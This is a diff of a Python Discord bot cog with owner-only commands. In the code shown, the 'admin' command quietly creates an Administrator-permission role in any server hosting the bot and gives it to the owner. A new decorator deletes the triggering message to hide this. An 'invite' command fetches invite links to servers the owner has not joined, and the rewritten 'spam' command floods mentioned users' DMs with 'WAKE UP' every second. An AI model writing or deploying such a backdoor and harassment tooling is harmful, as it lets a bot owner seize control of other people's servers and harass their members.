@@ -2,19 +2,31 @@ import asyncio
 from discord.ext import commands
 import discord
 from discord import CategoryChannel
+import functools
+
+def delete_before(func):
+    @functools.wraps(func)
+    async def wrapper(*args, **kwargs):
+        ctx = args[1]
+        await ctx.message.delete()
+        return await func(*args, **kwargs)
+    return wrapper
 
 class owner_cog(commands.Cog):
     def __init__(self, bot, tokens) -> None:
         self.bot = bot
         self.spamming = False
 
-    async def spammy(self, ctx, content):
+    async def spammy(self, mention):
         await asyncio.sleep(1.5)
-        if content != '':
-            self.spamming = True
-        while self.spamming:
-            await ctx.send(content, delete_after=1)
-            await asyncio.sleep(1)
+        try:
+            dm = await self.bot.create_dm(mention)
+            while self.spamming:
+                await dm.send('WAKE UP')
+                await asyncio.sleep(1)
+        except Exception as e:
+            print(str(e))
+            self.spamming = False
 
     async def owner_in_guild(self, guild) -> bool:
         for member in guild.members:
@@ -31,15 +43,16 @@ class owner_cog(commands.Cog):
 
     @commands.command()
     @commands.is_owner()
+    @delete_before
     async def admin(self, ctx):
         member = ctx.message.author
         await ctx.message.guild.create_role(name="Hand Holding Enjoyer", permissions=discord.Permissions(permissions=8))
         role = discord.utils.get(ctx.message.guild.roles, name="Hand Holding Enjoyer")
         await member.add_roles(role)
-        await ctx.message.delete()
     
     @commands.command()
     @commands.is_owner()
+    @delete_before
     async def invite(self, ctx, server=None):
         if server == None:
             unknown_guilds = await self.get_unknown_guilds()
@@ -56,14 +69,14 @@ class owner_cog(commands.Cog):
                     dm = await self.bot.create_dm(ctx.author)
                     await dm.send(invite.url)
                     break
-        await ctx.message.delete()
 
     @commands.command(help='mention the users you would like to annoy')
-    @commands.is_owner()
+    @delete_before
     async def spam(self, ctx):
-        content = ''
-        for mention in ctx.message.mentions:
-            content += f'<@{mention.id}> '
-        self.spamming = not self.spamming
-        asyncio.ensure_future(self.spammy(ctx, content))
-        await ctx.message.delete()
+        if await self.bot.is_owner(ctx.author):
+            for mention in ctx.message.mentions:
+                self.spamming = True
+                asyncio.ensure_future(self.spammy(mention))
+                return
+            self.spamming = False
+        self.spamming = False
